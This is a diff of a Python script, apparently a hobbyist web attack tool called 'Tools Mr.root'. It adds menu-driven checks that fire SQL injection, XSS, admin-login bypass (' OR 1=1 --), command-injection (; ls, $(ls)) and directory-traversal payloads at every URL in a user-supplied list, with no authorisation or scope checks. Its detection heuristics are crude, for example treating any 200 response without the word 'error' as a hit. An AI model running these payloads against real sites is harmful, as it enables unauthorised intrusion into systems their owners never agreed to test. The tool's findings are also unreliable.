@@ -1,114 +1,144 @@
-import os
-import time
 import requests
-from tqdm import tqdm
-from termcolor import colored
-from prettytable import PrettyTable
-from colorama import init
+import argparse
+import time
+import os
+from bs4 import BeautifulSoup
+from colorama import Fore, Back, Style, init
 import pyfiglet
-from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
 
 # Initialize colorama
 init(autoreset=True)
 
-# Display welcome message using pyfiglet for large text
+# Function to simulate the white line effect up to 100
+def loading_effect():
+    for i in range(101):
+        print(f"\r{'=' * i}{'.' * (100 - i)}", end="")
+        time.sleep(0.05)
+    print("\n")
+    time.sleep(1)
+
+# Function to display the welcome message with big font and colors
 def show_welcome_message():
-    os.system('clear' if os.name == 'posix' else 'cls')  # Clear terminal screen
+    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen (works on both Windows and Unix)
 
-    # Create the banner with pyfiglet
-    welcome_message = pyfiglet.figlet_format("Tools Mr.root", font="slant")
-    print(colored(welcome_message, "cyan"))
+    # Display "Welcome to Tools" in large font
+    welcome_text = pyfiglet.figlet_format("Welcome to Tools")
+    print(Fore.YELLOW + welcome_text)  # Print the welcome message in yellow
+    time.sleep(5)  # Wait for 5 seconds before continuing
 
-    # Wait for 5 seconds before starting
-    time.sleep(5)
+# SQL Injection Detection
+def check_sql_injection(url):
+    payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a", '" OR "a"="a']
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if "error" not in response.text and response.status_code == 200:
+            print(f"{Fore.GREEN}[+] SQL Injection vulnerability found in: {url}")
+            print(f"  Payload: {payload}")
+            return True
+    return False
 
-    # Clear the screen
-    os.system('clear' if os.name == 'posix' else 'cls')
+# XSS Detection
+def check_xss(url):
+    payloads = ['<script>alert(1)</script>', '<img src="x" onerror="alert(1)">']
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if payload in response.text:
+            print(f"{Fore.GREEN}[+] XSS vulnerability found in: {url}")
+            print(f"  Payload: {payload}")
+            return True
+    return False
 
-# Load data from file
-def load_file(filename):
-    if not os.path.exists(filename):
-        print(colored(f"File '{filename}' not found!", "red"))
-        return []
-    with open(filename, "r") as file:
-        return [line.strip() for line in file if line.strip()]
+# Admin Bypass Detection
+def check_admin_bypass(url):
+    payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a", '" OR "a"="a']
+    response = requests.post(url, data={"username": "admin", "password": payloads[0]})
+    if "Welcome Admin" in response.text:  # Example: adjust based on the actual admin page response
+        print(f"{Fore.GREEN}[+] Admin Bypass vulnerability found in: {url}")
+        print(f"  Payload: {payloads[0]}")
+        return True
+    return False
 
-# Inject payload into a URL
-def inject_payload(url, param, payload):
-    parsed_url = urlparse(url)
-    query_params = parse_qs(parsed_url.query)
-    if param in query_params:
-        query_params[param] = payload
-    modified_query = urlencode(query_params, doseq=True)
-    modified_url = urlunparse(parsed_url._replace(query=modified_query))
-    return modified_url
+# Command Injection Detection
+def check_command_injection(url):
+    payloads = ["; ls", "| ls", "& ls", "$(ls)"]
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if "bin" in response.text:  # A basic check to see if we get command output
+            print(f"{Fore.GREEN}[+] Command Injection vulnerability found in: {url}")
+            print(f"  Payload: {payload}")
+            return True
+    return False
 
-# Test a URL with a payload
-def test_vulnerability(url, payload):
-    test_url = url + payload if '?' not in url else inject_payload(url, list(parse_qs(urlparse(url).query).keys())[0], payload)
-    try:
-        response = requests.get(test_url, timeout=5)
-        if response.status_code == 200 and (
-            "sql" in response.text.lower() or 
-            "syntax error" in response.text.lower() or
-            "alert" in response.text.lower()
-        ):
-            return True, test_url
-    except Exception:
-        pass
-    return False, None
+# Directory Traversal Detection
+def check_directory_traversal(url):
+    payloads = ["../", "..%2f", "%2e%2e%2f"]
+    for payload in payloads:
+        response = requests.get(url + payload)
+        if "error" not in response.text and response.status_code == 200:
+            print(f"{Fore.GREEN}[+] Directory Traversal vulnerability found in: {url}")
+            print(f"  Payload: {payload}")
+            return True
+    return False
 
-# Scan for vulnerabilities
-def scan_vulnerabilities(base_url, paths, payloads):
-    results_table = PrettyTable()
-    results_table.field_names = ["URL", "Payload", "Status"]
-    results_table.align = "l"
+# Generic vulnerability scanning function
+def scan_site(url, vuln_type):
+    if vuln_type == 'sql':
+        return check_sql_injection(url)
+    elif vuln_type == 'xss':
+        return check_xss(url)
+    elif vuln_type == 'admin':
+        return check_admin_bypass(url)
+    elif vuln_type == 'cmd':
+        return check_command_injection(url)
+    elif vuln_type == 'dir':
+        return check_directory_traversal(url)
+    else:
+        print(f"{Fore.RED}[!] Unknown vulnerability type.")
+        return False
 
-    for path in paths:
-        full_url = urljoin(base_url, path)
-        for payload in payloads:
-            is_vulnerable, vulnerable_url = test_vulnerability(full_url, payload)
-            if is_vulnerable:
-                results_table.add_row([colored(full_url, "green"), payload, colored("Vulnerable", "green")])
-                print(colored(f"[+] Found vulnerability: {vulnerable_url} (Payload: {payload})", "green"))
-            else:
-                results_table.add_row([full_url, payload, colored("Not Vulnerable", "red")])
-
-    return results_table
-
-# Main function
+# Main function to parse arguments and perform scanning
 def main():
-    show_welcome_message()
-
-    # Request base URL
-    base_url = input("Enter the base URL (e.g., https://example.com): ").strip()
-    if not base_url.startswith("http"):
-        print(colored("Invalid URL. Please include http:// or https://", "red"))
+    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
+    loading_effect()  # Display loading effect up to 100
+    show_welcome_message()  # Show welcome message
+    
+    # Now start the program with "Tools Mr.root"
+    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen after welcome message
+    print(Fore.CYAN + pyfiglet.figlet_format("Tools Mr.root"))  # Display tool name in large font
+    print(Fore.GREEN + "Available Commands:")
+    print(Fore.YELLOW + "[1] SQL Injection scan (sql)")
+    print(Fore.YELLOW + "[2] XSS scan (xss)")
+    print(Fore.YELLOW + "[3] Admin Bypass scan (admin)")
+    print(Fore.YELLOW + "[4] Command Injection scan (cmd)")
+    print(Fore.YELLOW + "[5] Directory Traversal scan (dir)")
+    print(Fore.RED + "[6] Exit")
+    
+    # Ask for user input for scanning
+    vuln_type = input(Fore.CYAN + "Enter the vulnerability type (e.g., sql, xss, admin, cmd, dir): ").strip().lower()
+    if vuln_type not in ['sql', 'xss', 'admin', 'cmd', 'dir']:
+        print(f"{Fore.RED}[!] Invalid option!")
         return
 
-    # Load paths and payloads
-    paths_sql = load_file("paths_sql.txt")
-    paths_xss = load_file("paths_xxss.txt")
-    sql_payloads = load_file("payloads_sql.txt")
-    xss_payloads = load_file("payloads_xss.txt")
-
-    if not paths_sql or not paths_xss or not sql_payloads or not xss_payloads:
-        print(colored("One or more files are missing. Make sure paths and payloads are in the correct files.", "red"))
+    url_list = input(Fore.CYAN + "Enter the path to the URL list file (e.g., urls.txt): ").strip()
+    if not url_list:
+        print(f"{Fore.RED}[!] URL list file not provided!")
         return
 
-    # Scan for SQL Injection vulnerabilities
-    print("\n[+] Scanning for SQL Injection...")
-    sql_results = scan_vulnerabilities(base_url, paths_sql, sql_payloads)
+    # Read URLs from the file
+    try:
+        with open(url_list, 'r') as file:
+            urls = file.readlines()
+    except FileNotFoundError:
+        print(f"{Fore.RED}[!] The file '{url_list}' was not found!")
+        return
 
-    # Scan for XSS vulnerabilities
-    print("\n[+] Scanning for XSS...")
-    xss_results = scan_vulnerabilities(base_url, paths_xss, xss_payloads)
+    for url in urls:
+        url = url.strip()
+        print(f"{Fore.CYAN}Scanning {url} for {vuln_type}...")
+        if scan_site(url, vuln_type):
+            print(f"{Fore.GREEN}[+] Vulnerability found in {url}")
+        else:
+            print(f"{Fore.RED}[-] No vulnerability found in {url}")
 
-    # Display results
-    print("\nSQL Injection Results:")
-    print(sql_results)
-    print("\nXSS Results:")
-    print(xss_results)
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
